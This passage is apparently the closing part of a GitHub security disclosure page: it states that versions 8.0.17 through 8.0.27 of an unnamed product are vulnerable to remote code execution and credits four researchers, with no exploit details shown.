As a result of our testing, versions 8.0.17 through 8.0.27 are vulnerable to RCE.

## Discovered by

Francesco Iaria

Riccardo Degli Esposti

Claudio Rimensi

Francesco Varotto

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


